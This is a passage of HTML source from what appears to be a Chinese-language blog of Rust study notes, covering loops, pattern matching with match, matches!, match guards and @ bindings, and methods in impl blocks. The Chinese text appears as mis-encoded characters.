punctuation">;</span><span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is divisible by 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is divisible by 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is divisible by 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is not divisible by 4, 3, or 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// forå¾ªç¯</span><span class="token comment">// æœ‰ç‚¹ç±»ä¼¼kt, æ”¯æŒåŒºé—´</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..=</span><span class="token number">5</span> <span class="token punctuation">{</span>   <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// éå†é›†åˆ</span><span class="token comment">// æ³¨æ„æ‰€æœ‰æƒçš„è½¬ç§»ï¼Œä¸å–å¼•ç”¨çš„è¯ä¸‹é¢å°±ç”¨ä¸äº†containeräº†</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token operator">&amp;</span>container <span class="token punctuation">{</span>  <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token comment">// éå†æ—¶ä¿®æ”¹</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> collection <span class="token punctuation">{</span>  <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token comment">// éå†indexå’Œå€¼</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// `.iter()` æ–¹æ³•æŠŠ `a` æ•°ç»„å˜æˆä¸€ä¸ªè¿­ä»£å™¨</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"ç¬¬{}ä¸ªå…ƒç´ æ˜¯{}"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// æ— é™å¾ªç¯ ç­‰ä»·äºwhile(true)</span><span class="token keyword">loop</span> <span class="token punctuation">{</span>   <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œrustçš„breakæ—¢å¯ä»¥å•ç‹¬ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥è®©ä»–è¿”å›ä¸€ä¸ªå€¼</p><p>loopæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå› è€Œå¯ä»¥è¿”å›ä¸€ä¸ªå€¼</p></blockquote><h2 id="æ¨¡å¼åŒ¹é…"><a href="#æ¨¡å¼åŒ¹é…" class="headerlink" title="æ¨¡å¼åŒ¹é…"></a>æ¨¡å¼åŒ¹é…</h2><blockquote><p>ç”»é‡ç‚¹ï¼Œrustçš„æ¨¡å¼åŒ¹é…éå¸¸å¼ºå¤§ï¼Œä»¥è‡³äºå…¶ä»–è¯­è¨€éƒ½åœ¨æŠ„</p></blockquote><h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// è¿™é‡Œæ˜¯æ¯”è¾ƒç±»ä¼¼äºå…¶ä»–è¯­è¨€switchçš„ç”¨æ³•</span><span class="token comment">// ä½†matchæ¯”switchå¼ºå¤§å¾—å¤š</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Coin</span> <span class="token punctuation">{</span>    <span class="token class-name">Penny</span><span class="token punctuation">,</span>    <span class="token class-name">Nickel</span><span class="token punctuation">,</span>    <span class="token class-name">Dime</span><span class="token punctuation">,</span>    <span class="token class-name">Quarter</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">value_in_cents</span><span class="token punctuation">(</span>coin<span class="token punctuation">:</span> <span class="token class-name">Coin</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">u8</span> <span class="token punctuation">{</span>    <span class="token keyword">match</span> coin <span class="token punctuation">{</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Penny</span> <span class="token operator">=&gt;</span>  <span class="token punctuation">{</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Lucky penny!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token number">1</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Nickel</span> <span class="token operator">=&gt;</span> <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Dime</span> <span class="token operator">=&gt;</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Quarter</span> <span class="token operator">=&gt;</span> <span class="token number">25</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// matchæ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¯ä»¥ç”¨æ¥èµ‹å€¼</span><span class="token keyword">enum</span> <span class="token type-definition class-name">IpAddr</span> <span class="token punctuation">{</span>   <span class="token class-name">Ipv4</span><span class="token punctuation">,</span>   <span class="token class-name">Ipv6</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> ip1 <span class="token operator">=</span> <span class="token class-name">IpAddr</span><span class="token punctuation">::</span><span class="token class-name">Ipv6</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> ip_str <span class="token operator">=</span> <span class="token keyword">match</span> ip1 <span class="token punctuation">{</span>        <span class="token class-name">IpAddr</span><span class="token punctuation">::</span><span class="token class-name">Ipv4</span> <span class="token operator">=&gt;</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>        _ <span class="token operator">=&gt;</span> <span class="token string">"::1"</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> ip_str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// æ¨¡å¼ç»‘å®š ï¼ˆæœ‰ç‚¹åƒè§£æ„ï¼‰</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Coin</span> <span class="token punctuation">{</span>    <span class="token class-name">Penny</span><span class="token punctuation">,</span>    <span class="token class-name">Nickel</span><span class="token punctuation">,</span>    <span class="token class-name">Dime</span><span class="token punctuation">,</span>    <span class="token class-name">Quarter</span><span class="token punctuation">(</span><span class="token class-name">UsState</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 25ç¾åˆ†ç¡¬å¸</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">value_in_cents</span><span class="token punctuation">(</span>coin<span class="token punctuation">:</span> <span class="token class-name">Coin</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">u8</span> <span class="token punctuation">{</span>    <span class="token keyword">match</span> coin <span class="token punctuation">{</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Penny</span> <span class="token operator">=&gt;</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Nickel</span> <span class="token operator">=&gt;</span> <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Dime</span> <span class="token operator">=&gt;</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token comment">// è¿™é‡Œå¯ä»¥é€šè¿‡è¿™æ ·çš„å†™æ³•ç›´æ¥æ‹¿åˆ°state</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Quarter</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"State quarter from {:?}!"</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token number">25</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// æœ‰æ—¶ä¼šé‡åˆ°åªæœ‰ä¸€ä¸ªæ¨¡å¼çš„å€¼éœ€è¦è¢«å¤„ç†ï¼Œå…¶å®ƒå€¼ç›´æ¥å¿½ç•¥çš„åœºæ™¯ï¼Œå¦‚æœç”¨ match æ¥å¤„ç†å°±è¦å†™æˆä¸‹é¢è¿™æ ·</span><span class="token keyword">let</span> v <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3u8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">match</span> v <span class="token punctuation">{</span>   <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   _ <span class="token operator">=&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">// è¿™ç§æƒ…å†µä¸‹å¯ä»¥ç›´æ¥ç”¨è¯­æ³•ç³–ç®€åŒ–</span><span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> v <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>matchçš„åŒ¹é…å¿…é¡»ç©·å°½æ‰€æœ‰çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯å¦‚æœä¸åˆ—å‡ºæ‰€æœ‰çš„å¯èƒ½ï¼Œå¿…é¡»å®šä¹‰_ =&gt;åˆ†æ”¯</p></blockquote><h3 id="matches-å®"><a href="#matches-å®" class="headerlink" title="matches!å®"></a>matches!å®</h3><blockquote><p>è·Ÿjavaä¸­çš„String#matchesæ¯”è¾ƒç±»ä¼¼ï¼Œå¦‚æœæˆ‘åªæ˜¯æƒ³çŸ¥é“æŸä¸ªå®ä¾‹æ˜¯å¦åŒ¹é…ä¸Šäº†æˆ‘ç»™ä¸çš„æ¨¡å¼ï¼Œå¯ä»¥ä¸ç”¨ç‰¹æ„å»macth,ç›´æ¥è°ƒç”¨matches!å®ã€‚</p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// ä½¿ç”¨match</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token char string">'f'</span><span class="token punctuation">;</span><span class="token keyword">let</span> matched <span class="token operator">=</span> <span class="token keyword">match</span> foo <span class="token punctuation">{</span>    <span class="token char string">'A'</span><span class="token punctuation">..</span><span class="token char string">'Z'</span> <span class="token operator">|</span> <span class="token char string">'a'</span><span class="token punctuation">..</span><span class="token char string">'z'</span> <span class="token operator">=&gt;</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    _ <span class="token operator">=&gt;</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">// ä½¿ç”¨matches!</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token char string">'f'</span><span class="token punctuation">;</span><span class="token keyword">let</span> matched <span class="token operator">=</span> <span class="token macro property">matches!</span><span class="token punctuation">(</span>foo<span class="token punctuation">,</span> <span class="token char string">'A'</span><span class="token punctuation">..</span><span class="token char string">'Z'</span> <span class="token operator">|</span> <span class="token char string">'a'</span><span class="token punctuation">..</span><span class="token char string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è§£æ„"><a href="#è§£æ„" class="headerlink" title="è§£æ„"></a>è§£æ„</h3><p>è§£æ„å…¶å®ä¹Ÿæ˜¯æ¨¡å¼åŒ¹é…å®ç°çš„ï¼Œåœ¨ä¸Šä¸€èŠ‚ç¬”è®°ä¸­å·²ç»å†™è¿‡äº†ï¼Œä¸åšè¯¦ç»†ä»‹ç»</p><h3 id="åŒ¹é…å®ˆå«"><a href="#åŒ¹é…å®ˆå«" class="headerlink" title="åŒ¹é…å®ˆå«"></a>åŒ¹é…å®ˆå«</h3><blockquote><p>åœ¨è¦åŒ¹é…çš„æ¨¡å¼åé¢å¯ä»¥åŠ ä¸Šif conditionï¼Œæ¥å¯¹æ¨¡å¼åŒ¹é…è¿›è¡Œè¿›ä¸€æ­¥é™åˆ¶</p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">match</span> x <span class="token punctuation">{</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Got 50"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token keyword">if</span> n <span class="token operator">==</span> y <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Matched, n = {}"</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span>        _ <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Default case, x = {:?}"</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"at the end: x = {:?}, y = {}"</span><span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>åŒ¹é…å®ˆå«çš„æ¡ä»¶ä¼šä½œç”¨äºæ‰€æœ‰çš„æ¨¡å¼</strong></p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">match</span> x <span class="token punctuation">{</span>    <span class="token number">4</span> <span class="token operator">|</span> <span class="token number">5</span> <span class="token operator">|</span> <span class="token number">6</span> <span class="token keyword">if</span> y <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"yes"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    _ <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¿™ä¸ªä¾‹å­ä¸­çœ‹èµ·æ¥å¥½åƒ <code>if y</code> åªä½œç”¨äº <code>6</code>ï¼Œä½†å®é™…ä¸ŠåŒ¹é…å®ˆå« <code>if y</code> ä½œç”¨äº <code>4</code>ã€<code>5</code> <strong>å’Œ</strong> <code>6</code> ï¼Œåœ¨æ»¡è¶³ <code>x</code> å±äº <code>4 | 5 | 6</code> åæ‰ä¼šåˆ¤æ–­ <code>y</code> æ˜¯å¦ä¸º <code>true</code>ï¼š</p></blockquote><h3 id="ç»‘å®š"><a href="#ç»‘å®š" class="headerlink" title="@ç»‘å®š"></a>@ç»‘å®š</h3><blockquote><p>è¯´ç™½äº†å°±æ˜¯æˆ‘ä»¬å³æƒ³è¦æ¨¡å¼åŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸååˆæƒ³é€šè¿‡è§£æ„çš„å½¢å¼æ‹¿åˆ°å¯¹åº”çš„å€¼</p><p>å°å­©å­æ‰åšé€‰æ‹© å¤§äººå…¨éƒ½è¦ï¼</p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">enum</span> <span class="token type-definition class-name">Message</span> <span class="token punctuation">{</span>    <span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token keyword">i32</span> <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">let</span> msg <span class="token operator">=</span> <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token number">5</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">match</span> msg <span class="token punctuation">{</span>    <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> id_variable <span class="token operator">@</span> <span class="token number">3</span><span class="token punctuation">..=</span><span class="token number">7</span> <span class="token punctuation">}</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Found an id in range: {}"</span><span class="token punctuation">,</span> id_variable<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id<span class="token punctuation">:</span> <span class="token number">10</span><span class="token punctuation">..=</span><span class="token number">12</span> <span class="token punctuation">}</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Found an id in another range"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token class-name">Message</span><span class="token punctuation">::</span><span class="token class-name">Hello</span> <span class="token punctuation">{</span> id <span class="token punctuation">}</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>        <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Found some other id: {}"</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸Šé¢è¿™ä¸ªä¾‹å­çš„ç¬¬ä¸€ä¸ªåˆ†æ”¯ä¸­ï¼Œæˆ‘ä»¬æ—¢é€šè¿‡è§£æ„æ‹¿åˆ°äº†idï¼Œåˆå¯¹ä»–è¿›è¡Œäº†æ¨¡å¼åŒ¹é…: åœ¨3..=7èŒƒå›´å†…æ‰èƒ½é€šè¿‡ã€‚</p><p>æ³¨æ„:</p><blockquote><p>è€ƒè™‘ä¸‹é¢ä¸€æ®µä»£ç :</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">match</span> <span class="token number">1</span> <span class="token punctuation">{</span>        num <span class="token operator">@</span> <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        _ <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¼–è¯‘ä¸é€šè¿‡ï¼Œæ˜¯å› ä¸º <code>num</code> æ²¡æœ‰ç»‘å®šåˆ°æ‰€æœ‰çš„æ¨¡å¼ä¸Šï¼Œåªç»‘å®šäº†æ¨¡å¼ <code>1</code>ï¼Œä½ å¯èƒ½ä¼šè¯•å›¾é€šè¿‡è¿™ä¸ªæ–¹å¼æ¥è§£å†³ï¼š</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust">num <span class="token operator">@</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½†æ˜¯ï¼Œå¦‚æœä½ ç”¨çš„æ˜¯ Rust 1.53 ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œé‚£è¿™ç§å†™æ³•ä¼šæŠ¥é”™ï¼Œå› ä¸ºç¼–è¯‘å™¨ä¸æ”¯æŒã€‚</p></blockquote><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><p>Rustä½¿ç”¨<code>impl</code>å—æ¥å®šä¹‰æ–¹æ³•ï¼Œå¤šè¯´æ— ç›Šï¼Œå…ˆæ¥ä¸€æ®µç¤ºä¾‹ä»£ç </p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Circle</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token comment">// newæ˜¯Circleçš„å…³è”å‡½æ•°ï¼Œå› ä¸ºå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸æ˜¯self</span>    <span class="token comment">// è¿™ç§æ–¹æ³•å¾€å¾€ç”¨äºåˆå§‹åŒ–å½“å‰ç»“æ„ä½“çš„å®ä¾‹</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>        <span class="token class-name">Circle</span> <span class="token punctuation">{</span>            x<span class="token punctuation">:</span> x<span class="token punctuation">,</span>            y<span class="token punctuation">:</span> y<span class="token punctuation">,</span>            radius<span class="token punctuation">:</span> radius<span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment">// Circleçš„æ–¹æ³•ï¼Œ&amp;selfè¡¨ç¤ºå€Ÿç”¨å½“å‰çš„Circleç»“æ„ä½“</span>    <span class="token keyword">fn</span> <span class="token function-definition function">area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f64</span> <span class="token punctuation">{</span>        <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token keyword">f64</span><span class="token punctuation">::</span><span class="token namespace">consts<span class="token punctuation">::</span></span><span class="token constant">PI</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">self</span><span class="token punctuation">.</span>radius <span class="token operator">*</span> <span class="token keyword">self</span><span class="token punctuation">.</span>radius<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸javaçš„ä¸åŒåœ¨äºï¼Œè¦å®ç°ä¸€ä¸ªç±»ä¼¼äºjavaç±»çš„ç»“æ„ï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰structå’Œå®ƒçš„implï¼Œç›¸å½“äºå­—æ®µçš„å£°æ˜å’Œæ–¹æ³•çš„å£°æ˜è¢«åˆ†å¼€äº†ã€‚</p><p>å¹¶ä¸”ï¼Œimplå¯ä»¥æœ‰å¾ˆå¤šä¸ª</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">struct</span> <span class="token type-definition class-name">Circle</span> <span class="token punctuation">{</span>    x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span>    radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> radius<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>        <span class="token class-name">Circle</span> <span class="token punctuation">{</span>            x<span class="token punctuation">:</span> x<span class="token punctuation">,</span>            y<span class="token punctuation">:</span> y<span class="token punctuation">,</span>            radius<span class="token punctuation">:</span> radius<span class="token punctuation">,</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">impl</span> <span class="token class-name">Circle</span> <span class="token punctuation">{</span>    <span class="token keyword">fn</span> <span class="token function-definition function">area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">f64</span> <span class="token punctuation">{</span>        <span class="token namespace">std<span class="token punctuation">::</span></span><span class="token keyword">f64</span><span class="token punctuation">::</span><span class="token namespace">consts<span class="token punctuation">::</span></span><span 